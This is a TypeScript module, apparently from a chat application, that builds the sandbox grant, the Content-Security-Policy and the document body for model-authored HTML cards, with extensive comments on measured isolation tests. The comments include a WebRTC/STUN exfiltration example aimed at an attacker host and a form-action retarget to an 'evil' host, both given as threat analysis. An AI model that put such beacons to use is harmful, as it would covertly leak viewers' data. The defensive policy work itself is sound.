// @orb/kit/card-frame — the ONE card-frame security engine: the sandboxed document body + the CSP that
// makes it a boundary. Pure, isomorphic, zero-I/O. TWO callers assemble the SAME bytes through it:
//   • the SERVER (`entry/http/card-frame.ts`) — the ROUTED arm, `src=`-loaded, policy on the RESPONSE header.
//   • the CLIENT (`@orb/ui` sandbox-frame) — the SRCDOC floor, policy in a `<meta http-equiv>`.
// It lives in kit precisely because a second spelling of a security policy is the defect this prevents.
//
// ── WHY TWO DELIVERY ARMS (measured 2026-08-09, Chromium 1.61 headless; probe in the lane report) ─────────
// A `srcdoc` iframe is a LOCAL-scheme document, so it INHERITS the embedding document's CSP ON TOP OF its
// own meta policy. Measured: an app document at `img-src 'self' blob:` framing a srcdoc whose meta policy
// says `img-src 'self' data:` paints the `data:` image at naturalWidth=0 — the parent policy wins the
// intersection. The SAME document served from a URL (`src=/api/card-frame/<id>`) paints it. That is the
// whole mechanism of the trust-gated doorway: only a REAL response can carry a per-trust `img-src`.
//
// Two further measured facts the `document` arm is built on:
//   • `'self'` STILL resolves to the app origin inside a sandboxed (opaque-origin) document — Chromium
//     matches `'self'` against the precursor origin — so same-origin subresources stay expressible.
//   • the CSP `sandbox` DIRECTIVE makes the opaque origin a property of the RESPONSE, not of the embedder's
//     `sandbox=` attribute. A direct top-level navigation to the card URL is then ALSO opaque-origin
//     (measured: `window.origin === null`). Without it the same navigation lands model-authored HTML in the
//     app's own origin. It is not expressible in `<meta>` (the spec ignores
//     `sandbox`/`frame-ancestors`/`report-uri` there), which is the second reason the routed arm is the
//     primary and srcdoc is the floor. Since the 2026-08-16 tier-B pass that navigation is no longer
//     script-DEAD — it runs the one hash-pinned height script (which posts to itself and does nothing).
//     On the `static` posture every CARD-authored script stays refused by hash, in a frame and at top
//     level alike; on the `interactive` posture (#111 leg 3) card scripts run — inside the same opaque
//     origin, which is why the `sandbox` directive matters more after the grant, not less.
//
// ── FRAME NAVIGATION (measured 2026-08-16, Chromium via playwright-ct; #111 leg 2 — the tier-B review's
//    one UNVERIFIED control, and the prerequisite #110 named for the interactive grant) ────────────────────
// QUESTION: with `sandbox allow-scripts` (no `allow-top-navigation`/`allow-popups`/`allow-forms`, never
// `allow-same-origin`), this document's own `default-src 'none'`, and the APP document's `default-src 'self'`
// above it — where can a card document navigate? ANSWER, per vector (probe:
// `tests/ui/content/sandbox-frame/sandbox-frame.ct.tsx`, which serves the REAL bytes under the REAL policies
// inside a parent carrying the app's own directives, and records every target that is actually REQUESTED):
//   • a card `<a href="https://elsewhere">` navigating the FRAME ITSELF — REFUSED. The EMBEDDER's policy
//     governs where its frame may go, whoever initiates: the app names no `frame-src`, so `default-src
//     'self'` is the belt. CONTROL: the identical probe with the parent widened to `frame-src *` DOES land
//     the request, and a SAME-ORIGIN target lands under the app policy — so this is a real block, not a
//     probe that could never navigate anything.
//   • `target="_top"` — REFUSED (two belts: the sandbox has no `allow-top-navigation`, and the destination
//     is off-origin anyway). The top document stays put.
//   • a `<form action="https://elsewhere">` submit — REFUSED (`form-action 'none'`, this document's own).
//   • a `<meta http-equiv="refresh">` — REFUSED. Note this one needs NO script, so it is reachable under
//     today's posture and is not something an interactivity grant would newly enable.
//   • the INTERACTIVE posture (since #111 leg 3 this is the SHIPPED policy, not a lab arm): card code RUNS
//     (positive control: it stamps the body) and STILL reaches no navigation — `top.location` and
//     `window.open` die on the sandbox, and `location.href` off-origin dies on the app's `default-src
//     'self'`, exactly as the script-free link does. Chromium leaves the refused frame at an empty
//     `about:blank`.
// CONSEQUENCE, now settled: the script grant adds NO navigation reach a static card does not already have.
// The belt is the APP document's CSP — which is why `entry/http/security-headers.ts` now names `frame-src
// 'self'` EXPLICITLY instead of leaning on the `default-src` fallback: the residual was that a deployment
// widening `default-src` for some unrelated reason would silently widen frame navigation for BOTH postures
// at once. Serving a card frame from a page with a looser policy would still lose the control.
//
// ── THE INTERACTIVE GRANT'S REACH CENSUS (measured 2026-08-16, #111 leg 3 — the security pass; Chromium
//    149.0.7827.55, two REAL http servers so "did it land" is a hit counter on the far end, never a
//    devtools event) ───────────────────────────────────────────────────────────────────────────────────
// QUESTION: with `script-src 'unsafe-inline'`, what NEW reach does a card-authored script buy?
// ANSWER: over HTTP, none at all. The same three off-origin requests land with scripts and without them:
//   • floor media (`img-src 'self'`), script-free card → NOTHING lands off-origin.
//   • floor media, SCRIPTED card → NOTHING lands off-origin. `fetch`/XHR/`WebSocket`/`EventSource`/
//     `sendBeacon` are refused by `default-src 'none'` (no `connect-src`, deliberately); an external
//     `<script src>` and a `blob:`/`data:` Worker are refused by the `script-src`/`worker-src` fallback
//     ('unsafe-inline' matches no URL, so naming `worker-src 'none'` would be a directive with nothing to
//     add); a nested `<iframe>` is refused by the `frame-src` fallback; `eval`/`new Function` throw
//     EvalError (no `'unsafe-eval'`).
//   • external media ON, script-free card → `<img>`, `<link rel=prefetch>`, `<video>` land.
//   • external media ON, SCRIPTED card → EXACTLY the same three. Nothing new.
// So the HTTP exfil channel is the media allowance, it predates the grant, and it stays behind the
// deployment "Block external media" ceiling. What the grant changes is not WHICH channel exists but what
// can be encoded in it: a script composes a URL from what it observed, where authored markup could only
// carry a constant.
// The frame's isolation holds under script: `document.cookie`, `localStorage`, `parent.document` and a
// SIBLING card frame's document all throw SecurityError, and a sibling frame cannot be navigated
// ("Unsafe attempt to initiate navigation for frame …"). A card CAN `postMessage` the embedder and its
// siblings; the embedder's listener authenticates by window identity and folds only a clamped height
// ({@link foldCardFrameHeight}), and a card document has no message listener at all.
//
// RESIDUAL R1 — WEBRTC, AND IT IS NOT CLOSEABLE HERE. An interactive card ran
// `new RTCPeerConnection({iceServers:[{urls:"stun:<attacker>:<port>"}]})` and FOUR STUN binding requests
// arrived at an attacker-chosen host:port on a real UDP listener. Reproduced on a plain-http LAN origin
// (`isSecureContext === false`), so the secure-context gate does NOT contain it. `webrtc 'block'` — the
// CSP3 directive for exactly this — is reported "Unrecognized" by Chromium 149, so emitting it would be
// dead config teaching the next reader a lie; it is NOT emitted. This channel is outside `connect-src`
// AND outside the external-media ceiling: an interactive card can beacon a view-receipt, a fingerprint,
// or anything a viewer is socially engineered into typing INSIDE the frame, on any deployment. It cannot
// reach the session, storage, the app DOM, or another card. THE ONLY CONTROL IS NOT SERVING THE POSTURE —
// which is why the deployment ceiling below is a precondition of the grant rather than a convenience. Its
// floor is ON by owner ruling (interactive cards are the default for every character), so R1 is open on a
// default deployment and the ceiling is the revocation an operator uses to close it. Each viewer can also
// close it for their own browser (`UserSettings.chat.runCardScripts`, honored at the server mint).
//
// ── THE COOKIE CEILING (measured in the same probe; corrects a claim that stood in two docs) ──────────────
// An opaque-origin document's same-origin subresource fetch is `Sec-Fetch-Site: cross-site`, so a
// `SameSite=Lax` cookie is WITHHELD. Our session cookie is `SameSite=Lax` (`entry/http/auth-routes.ts`), and
// `/api/blob/<hash>` is session-gated — so an `<img src="/api/blob/…">` inside a card frame 401s and paints
// nothing, on the srcdoc arm TODAY and on the routed arm equally. `'self'` is kept on the media directives
// for parity with the pre-existing policy (dropping it would be an unrequested tightening), but nobody should
// read it as "card images work from the CAS": under the current cookie policy they cannot, and the model
// cannot author a blob hash anyway. `data:` on a trusted card is the path that actually paints.

import { isPlainObject } from "#guards";
import { isSafeColor } from "#safe-color";

/** Where the policy is delivered. `document` = a `Content-Security-Policy` RESPONSE HEADER (the routed arm —
 *  can express `sandbox` + `frame-ancestors`, and is not intersected with the embedder's policy).
 *  `meta` = an in-document `<meta http-equiv>` (the srcdoc floor — those two directives are ignored there,
 *  so emitting them would be dead config that teaches the next reader a lie). */
export const CARD_FRAME_DELIVERIES = ["document", "meta"] as const;
export type CardFrameDelivery = (typeof CARD_FRAME_DELIVERIES)[number];

/**
 * The sandbox grant, PER DELIVERY — the ONE home for both spellings of it: the `iframe sandbox=` ATTRIBUTE
 * (`@orb/ui` sandbox-frame reads this record) and the CSP `sandbox` DIRECTIVE below. They were two constants
 * in two packages that a comment asked a reviewer to keep in sync; they are one value indexed by arm now.
 *
 * TIER-B TRUST REVIEW, 2026-08-16 (security-executor pass, #91), ARM B — the MINIMAL grant, and it did NOT
 * move when #111 leg 3 granted card scripts:
 *   • `document` (routed) = `allow-scripts`. Which scripts may run is decided ENTIRELY by `script-src` in
 *     the same policy ({@link CARD_FRAME_SCRIPT_SOURCES}) — one hash on the `static` posture, the card's
 *     own code on `interactive`. The sandbox is what makes either safe to say: opaque origin, no cookies,
 *     no storage, no reach into the app DOM, no top navigation, no popups, no forms.
 *   • `meta` (srcdoc floor) = EMPTY, every restriction on. A srcdoc document also inherits the app CSP
 *     (`script-src 'self'`), so a hash we do not also add to the APP policy could never match there —
 *     granting the flag would buy nothing and spend a belt. The floor stays script-dead; that arm keeps
 *     the fixed pre-measurement height and that is the accepted outcome (#91's defect is routed cards).
 * NEVER `allow-same-origin` on either arm (that combo lets the frame reach into the app origin and lets it
 * remove its own sandbox) — and the grant made that NEVER load-bearing rather than theoretical: with card
 * code executing, `allow-same-origin` would hand a model-authored script the app's session and DOM.
 */
export const CARD_FRAME_SANDBOX = { document: "allow-scripts", meta: "" } as const satisfies Record<CardFrameDelivery, string>;

/**
 * The card document's SCRIPT POSTURE — the per-document selection seam (#111 leg 1), GRANTED by leg 3's
 * security pass (2026-08-16).
 *
 *   • `static` — only OUR hash-pinned measurement script may execute. What a card gets when its character
 *     sits below the top rung ("Render HTML", "Untrusted"), when the deployment ceiling is off, and on
 *     every failure arm of the mint.
 *   • `interactive` — the card's character resolves to the TOP RUNG of the one ordered html-trust ladder
 *     (`RenderPolicy.htmlTrust`, contracts/chat: `untrusted` then `trusted` then `interactive`), resolved
 *     off the `characters` ladder columns against the `allowInteractiveCards` AppSetting. A character on
 *     "Inherit default" (an imported card included) resolves there whenever the ceiling is up. Interactive
 *     IMPLIES trusted by construction, so a frame in this posture always has the `data:` door too.
 *
 * THE CEILING IS AN AND (never `override ??`). The `allowInteractiveCards` AppSetting is the DEPLOYMENT
 * OPERATOR's, its floor is ON by owner ruling, and it is both the default rung of an inheriting card and
 * the veto no per-character answer rises above. It is the revocation because of residual R1 in the header
 * above: the grant opens a WebRTC/STUN channel that no CSP directive in Chromium can close, so switching
 * the posture off is the one control that exists. The per-character disable is a lower rung picked on the
 * character's Trust tab.
 *
 * The sandbox grant does NOT vary by posture: it is still `allow-scripts` alone (never `allow-same-origin`,
 * never `allow-top-navigation`/`allow-forms`/`allow-popups`) and only `script-src` moves — so
 * {@link CARD_FRAME_SANDBOX} stays keyed by delivery alone.
 *
 * TRUTH-REPAIR (2026-08-16, leg 1): #110/#111 both said the per-card knob "is NOT BUILT" and named
 * `config.features.immersiveHtmlInteractive` as the thing to build. That knob EXISTS and is something else:
 * `contracts/rpg/config.ts` (`default(true)`) drives which TEACHING prose slot the rpg reminder emits
 * (`domain/rpg/substrate/reminder.ts` — `rpg.card.askInteractive` vs `rpg.card.askStatic`). It is per-GAME,
 * defaults ON, shapes the PROMPT, and the program spec that introduced it explicitly REJECTED gating the
 * render on it ("a stored interactive card would break on a later toggle-off"). So it could not be the
 * selector for a script grant: it does not exist for a non-game chat, it says nothing about an imported
 * card, and a prompt-shaping default-on switch is not a security consent. The rpg ask-knob is untouched.
 */
export const CARD_FRAME_POSTURES = ["static", "interactive"] as const;
export type CardFramePosture = (typeof CARD_FRAME_POSTURES)[number];

/**
 * The ONE script the routed frame is allowed to run: measure the body and post the height to the embedder.
 * Kept to a single expression with no dependencies because its BYTES are the security boundary — the CSP
 * hash below is computed over exactly this string, so any edit (even whitespace) must be re-pinned by
 * `tests/kit/card-frame/index.test.ts`, which recomputes the digest rather than trusting the constant.
 *
 * `document.body.scrollHeight`, NOT `documentElement.scrollHeight`: the latter is floored at the VIEWPORT
 * height, so a short card in a tall frame would measure the frame it is trying to shrink and never report
 * a smaller number — the exact defect (#91) this channel exists to fix.
 *
 * `postMessage(..., "*")` because an opaque-origin document cannot know the embedder's origin to target it
 * (and could not be trusted with it): the payload is one integer, and the RECEIVER authenticates by window
 * identity, never by the message. See {@link foldCardFrameHeight}.
 */
export const CARD_FRAME_HEIGHT_SCRIPT =
  '(function(){var last=-1;function post(){var body=document.body;if(body===null){return;}var height=body.scrollHeight;if(height!==last){last=height;parent.postMessage({orbCardFrameHeight:height},"*");}}addEventListener("DOMContentLoaded",function(){new ResizeObserver(post).observe(document.body);});addEventListener("load",post);})();';

/** The CSP source expression pinning {@link CARD_FRAME_HEIGHT_SCRIPT} by digest. A literal, because kit is
 *  isomorphic (no `node:crypto`) and WebCrypto's digest is async — the recompute lives in the unit test,
 *  which is the gate: change the script without re-pinning and the suite REDs before the policy ships. */
export const CARD_FRAME_HEIGHT_SCRIPT_CSP_HASH = "'sha256-X4P6ct+XbYLNF4Q5h+h/1nJEA0TD7k/6cHZe/VxxMI0='";

/** The one keyword that turns the posture into a capability. Named so the grant is greppable and so the
 *  `static` row can assert against it by identity rather than by a re-typed string. */
const UNSAFE_INLINE = "'unsafe-inline'";

/**
 * The `script-src` sources per POSTURE, `document` delivery only (the `meta` floor names none — a srcdoc
 * document inherits the app's `script-src 'self'`, so a hash we did not also add to the APP policy could
 * never match there).
 *
 * THE INTERACTIVE ROW REPLACES THE HASH; IT DOES NOT JOIN IT. That is not a style choice — measured
 * 2026-08-16 (Chromium 149), a policy of `script-src 'unsafe-inline' 'sha256-…'` REFUSES the card's script
 * and says why: *"Note that 'unsafe-inline' is ignored if either a hash or nonce value is present in the
 * source list."* (CSP3 §"Match element to source list": the keyword is skipped whenever the list carries a
 * nonce- or hash-source.) An appended grant would therefore have read as live and granted nothing — the
 * dead-opt-in class this repo hunts. {@link CARD_FRAME_HEIGHT_SCRIPT} still runs on this arm because it is
 * ITSELF an inline script, so the height channel needs no second allowance and no exception.
 *
 * What the interactive row deliberately does NOT name, each with a measured reason in the header's reach
 * census: no `'unsafe-eval'` (eval/`new Function` throw), no host or scheme source (an external
 * `<script src>` is refused, so a card cannot pull remote code at render), no `worker-src` of its own (the
 * fallback to this directive already refuses `blob:`/`data:` workers), no `webrtc` (unrecognized by the
 * browser — R1), and still no `connect-src` anywhere, so `default-src 'none'` keeps the fetch/socket/beacon
 * family closed under BOTH postures.
 */
const CARD_FRAME_SCRIPT_SOURCES = {
  static: [CARD_FRAME_HEIGHT_SCRIPT_CSP_HASH],
  interactive: [UNSAFE_INLINE],
} as const satisfies Record<CardFramePosture, readonly string[]>;

/** The height channel's clamp. The message is UNTRUSTED input from a document whose body is model-authored,
 *  so the number it reports is an assertion, not a measurement we made — and on the `interactive` posture
 *  it is an assertion the CARD can make directly (its own script may `postMessage` whatever it likes; the
 *  static arm's hash is what stopped that). The clamp is therefore the whole defence, and the worst an
 *  interactive card buys itself is the cap: 720px, which it could already occupy by authoring tall content.
 *  • FLOOR: a card that reports 0 (or a hostile 1) must not collapse to an invisible hairline the reader
 *    cannot see or hit — one touch target is the smallest thing that still reads as an object.
 *  • CAP: the failure mode the clamp exists for is unbounded growth. 720px is about the mobile viewport
 *    #91 measures against; past it an INLINE card owns the whole screen and the reader loses the
 *    transcript, so taller content scrolls inside the frame (what every card past 320px already did) and the
 *    lightbox stays the see-it-big path. */
export const CARD_FRAME_MIN_HEIGHT_PX = 48;
export const CARD_FRAME_MAX_HEIGHT_PX = 720;

const HEIGHT_KEY = "orbCardFrameHeight";

/**
 * Fold one `message` payload into the frame's applied height. Returns `current` UNCHANGED for anything that
 * is not a valid growth — a foreign/garbage payload, a non-finite or non-numeric height, and any report
 * SMALLER than one already applied.
 *
 * The caller still owes the sender check (`event.source === iframe.contentWindow`); this half owns the
 * payload. Window identity is the only usable authentication: every sandboxed frame's `event.origin` is the
 * string `"null"`, so origin cannot tell OUR frame from any other opaque sender.
 *
 * MONOTONIC after the first report, deliberately: frame height feeds back into content height (`vh` units,
 * percentage heights, media queries), so a card — hostile or merely fluid — can otherwise drive an endless
 * measure/resize/measure loop that relayouts the whole transcript. Grow-only bounds that to ONE downward
 * step per mount, which is exactly the step #91 needs (the void closes on the first measurement); a later
 * shrink just leaves whitespace inside the frame.
 */
export function foldCardFrameHeight(current: number | undefined, data: unknown): number | undefined {
  if (!isPlainObject(data)) {
    return current;
  }
  const raw = data[HEIGHT_KEY];
  if (typeof raw !== "number" || !Number.isFinite(raw)) {
    return current;
  }
  // Ceil, not round: a fractional content height rounded DOWN clips its own last device pixel and the frame
  // grows a scrollbar over one subpixel.
  const clamped = Math.min(CARD_FRAME_MAX_HEIGHT_PX, Math.max(CARD_FRAME_MIN_HEIGHT_PX, Math.ceil(raw)));
  if (current !== undefined && clamped <= current) {
    return current;
  }
  return clamped;
}

/** The card frame's ONE variable axis pair — both decided by the SERVER (a client may select which
 *  character's policy applies, never what that policy IS). Absent/false ⇒ the safe floor. */
export interface CardFrameMediaPolicy {
  /** The app-tier "Block external media" ceiling ∧ the per-character verdict ⇒ `https:` on img/media. */
  readonly allowExternalMedia: boolean;
  /** The DOORWAY: `data:` on img/media, granted only when the character's resolved `renderPolicy.htmlTrust` is
   *  at or above `trusted` (the same step D294 uses to grant the tierB sandbox). Expressible ONLY on the `document` delivery —
   *  the srcdoc floor cannot out-vote the app document's `img-src`, which is why this door needed a route. */
  readonly allowInlineData: boolean;
}

export const CARD_FRAME_SAFE_FLOOR: CardFrameMediaPolicy = { allowExternalMedia: false, allowInlineData: false };

/** The card body the frame renders. `html`/`css` are MODEL-AUTHORED and pass through VERBATIM by design —
 *  the frame is the boundary, not a sanitizer. `themeTokens`/`fontFamily` are ours and ARE clamped. */
export interface CardFrameContent {
  readonly html: string;
  readonly css: string | undefined;
  readonly themeTokens: Readonly<Record<string, string>> | undefined;
  readonly fontFamily: string | undefined;
  /** The NON-COLOR `--*` slice (#799) — a radius, a spacing step, the mono font-family list. It rides its OWN
   *  slot for the reason `fontFamily` already does: `isSafeColor` is COLOR-ONLY, so a length or a family list
   *  is rejected by it outright and could never travel in `themeTokens`. Clamped by
   *  {@link clampCardFrameStyleTokens}, which admits exactly two shapes and rejects every CSS-escape / fetch
   *  vector, the same property the color clamp guarantees. Every field on this interface EXISTS on every
   *  construction site (never `?`), so a new one is a tsc-forced decision at each. */
  readonly styleTokens: Readonly<Record<string, string>> | undefined;
}

const CUSTOM_PROP_KEY = /^--[\w-]+$/u;
// A theme var carrying CSS-escape chars could break out of the <style> — drop it (per-field, never a
// whole-object reject: one bad token must not blank the card's whole surface/text theming).
const CSS_ESCAPE = /[<>{}]/u;
// A font-family LIST shape check (`isSafeColor` is color-only): letters/digits/space/comma/hyphen/quotes
// only, so a hostile custom-theme `--font-sans` cannot break out of the body rule.
const FONT_FAMILY_LIST = /^[\w ,'"-]{1,120}$/u;
// A CSS LENGTH/scalar shape check (#799) — a bare or unit-suffixed non-negative number, nothing else. No
// parens, no separators, no escapes, so it can carry neither a `url()` nor a `<style>` break-out.
const CSS_LENGTH = /^\d{1,4}(?:\.\d{1,4})?(?:px|rem|em|%)?$/u;

/** Keeps only entries whose key is a `--*` custom-property name and whose value passes `isSafeColor` — the
 *  SAME predicate `<ThemeScope>` uses, never a second weaker one. Applied at BOTH boundaries (the client
 *  before minting, the server before assembling): the server's call is the trust boundary. */
export function clampCardFrameThemeTokens(raw: unknown): Readonly<Record<string, string>> {
  if (!isPlainObject(raw)) {
    return {};
  }
  const out: Record<string, string> = {};
  for (const [key, value] of Object.entries(raw)) {
    if (typeof value === "string" && CUSTOM_PROP_KEY.test(key) && !CSS_ESCAPE.test(`${key}${value}`) && isSafeColor(value)) {
      out[key] = value;
    }
  }
  return out;
}

/** Keeps only NON-COLOR `--*` entries whose value is a CSS LENGTH or a FONT-FAMILY LIST (#799). It is the
 *  {@link clampCardFrameThemeTokens} discipline applied to the shapes `isSafeColor` structurally cannot judge:
 *  per-field (one bad token never blanks the rest), key-shape gated, CSS-escape gated, and the two value
 *  grammars are the same two the frame already trusts elsewhere (the length is new, the family list is the
 *  `fontFamily` slot's own). Applied at BOTH boundaries — the client before minting, the server before
 *  assembling — because the server's call is the trust boundary. */
export function clampCardFrameStyleTokens(raw: unknown): Readonly<Record<string, string>> {
  if (!isPlainObject(raw)) {
    return {};
  }
  const out: Record<string, string> = {};
  for (const [key, value] of Object.entries(raw)) {
    if (
      typeof value === "string" &&
      CUSTOM_PROP_KEY.test(key) &&
      !CSS_ESCAPE.test(`${key}${value}`) &&
      (CSS_LENGTH.test(value) || FONT_FAMILY_LIST.test(value))
    ) {
      out[key] = value;
    }
  }
  return out;
}

/** Re-validates a caller-supplied font-family list at the frame boundary; drops anything unsafe (the body
 *  then falls back to `sans-serif` — never serif). */
export function clampCardFrameFontFamily(raw: unknown): string | undefined {
  return typeof raw === "string" && FONT_FAMILY_LIST.test(raw) ? raw : undefined;
}

function mediaSources(policy: CardFrameMediaPolicy, delivery: CardFrameDelivery): string {
  const sources = ["'self'"];
  // `data:` is a DOCUMENT-arm capability by physics, not by choice: on the meta arm the embedder's `img-src`
  // is intersected in and drops it, so emitting it there would be a directive that can never match.
  if (policy.allowInlineData && delivery === "document") {
    sources.push("data:");
  }
  // `https:` only, NEVER `http:` — the app is commonly served over plain-http LAN with no HSTS, so an
  // `http:` allowance would be an unauthenticated cleartext channel (the app CSP's own rule, one vocabulary).
  if (policy.allowExternalMedia) {
    sources.push("https:");
  }
  return sources.join(" ");
}

/**
 * The card frame's Content-Security-Policy, verbatim. `default-src 'none'` denies everything not named —
 * including `connect-src`, so a card can style itself and can never fetch or phone home. `form-action`/
 * `base-uri` are named EXPLICITLY because neither falls back to `default-src` (a card
 * `<form action="https://evil">` and a `<base href>` retarget were both expressible under the old policy).
 * `style-src 'unsafe-inline'` is the card's whole point — the sandbox, not a nonce, is the guard.
 *
 * The DOCUMENT arm additionally names `script-src`, whose sources come from the document's POSTURE
 * ({@link CARD_FRAME_POSTURES}) — the only place scripts are nameable at all, and the ONLY directive the
 * posture moves. The META arm names none (and takes no posture), so `default-src 'none'` keeps covering
 * script-src there. The posture is REQUIRED rather than defaulted: a call site that has not decided which
 * document it is building must say `"static"` out loud, not inherit it from an argument it forgot.
 */
export function buildCardFrameCsp(policy: CardFrameMediaPolicy, delivery: CardFrameDelivery, posture: CardFramePosture): string {
  const media = mediaSources(policy, delivery);
  const directives = [
    `default-src 'none'`,
    `img-src ${media}`,
    `media-src ${media}`,
    `style-src 'unsafe-inline'`,
    `font-src 'self'`,
    `form-action 'none'`,
    `base-uri 'none'`,
  ];
  if (delivery === "meta") {
    return directives.join("; ");
  }
  // `sandbox` FIRST so a reader sees the isolation before the allowances, and the ONE script allowance
  // immediately after it — the two halves of the tier-B grant read as the pair they are reviewed as.
  // `frame-ancestors 'self'` says only our own origin may embed the card document (and, measured,
  // supersedes any X-Frame-Options on the same response — so the route owns its framing verdict outright).
  const grant = [`sandbox ${CARD_FRAME_SANDBOX.document}`.trim(), `script-src ${CARD_FRAME_SCRIPT_SOURCES[posture].join(" ")}`];
  return [...grant, ...directives, `frame-ancestors 'self'`].join("; ");
}

function themeVarsBlock(themeTokens: Readonly<Record<string, string>>): string {
  const decls = Object.entries(themeTokens)
    .map(([key, value]) => `${key}: ${value};`)
    .join(" ");
  return decls === "" ? "" : `:root { ${decls} }`;
}

// The base body rule so an UNSTYLED model card lands IN the app theme instead of browser-default
// white/serif. It USES the injected surface/text vars (`--sandbox-bg`/`--sandbox-fg`) — so an under-filled
// frame is a dark themed surface, not a white slab. The card's own CSS still layers on top of this.
function baseBodyBlock(fontFamily: string | undefined): string {
  const font = fontFamily === undefined ? "sans-serif" : `${fontFamily}, sans-serif`;
  return `body { margin: 0; padding: 0; background: var(--sandbox-bg); color: var(--sandbox-fg); font-family: ${font}; }`;
}

/**
 * Assembles the full card document. `metaCsp` is the SRCDOC arm's in-document policy; the routed arm passes
 * it `undefined` because its policy rides the response header (a `<meta>` copy there would be a second,
 * silently-diverging spelling of the same rule).
 *
 * `metaCsp` is therefore also the DELIVERY discriminator, and it decides whether the height script is
 * emitted: absent ⇒ the routed document, whose response policy names the script's hash ⇒ emit it; present ⇒
 * the srcdoc floor, where the embedder's `script-src 'self'` is intersected in and the hash can never match,
 * so a script tag there would be dead markup teaching the next reader that the floor measures itself. Same
 * physics as `data:` on the media directives.
 *
 * The script goes in `<head>`, ahead of the card body, so model-authored markup cannot swallow it (an
 * unclosed `<!--` in the body would) and so the untrusted content has no way to influence the one thing in
 * the document that is allowed to execute. It measures on DOMContentLoaded, hence never runs before a body.
 *
 * The clamps run HERE, on every call, regardless of what the caller already did — the server's call is a
 * trust boundary and must not inherit the client's word for it.
 */
export function buildCardFrameDocument(content: CardFrameContent, metaCsp?: string): string {
  // Colors and non-color scalars land in ONE `:root` block but pass through TWO clamps, because the shapes
  // they admit are disjoint — see `clampCardFrameStyleTokens`. A key present in both records resolves to the
  // style one (declaration order in the same block), which is inert: the two slices name different vars.
  const themeCss = themeVarsBlock({ ...clampCardFrameThemeTokens(content.themeTokens), ...clampCardFrameStyleTokens(content.styleTokens) });
  const baseBody = baseBodyBlock(clampCardFrameFontFamily(content.fontFamily));
  const meta = metaCsp === undefined ? "" : `<meta http-equiv="Content-Security-Policy" content="${metaCsp}">`;
  const script = metaCsp === undefined ? `<script>${CARD_FRAME_HEIGHT_SCRIPT}</script>` : "";
  return [
    "<!doctype html>",
    '<html><head><meta charset="utf-8">',
    meta,
    `<style>${themeCss} ${baseBody} ${content.css ?? ""}</style>`,
    script,
    "</head><body>",
    content.html,
    "</body></html>",
  ].join("");
}
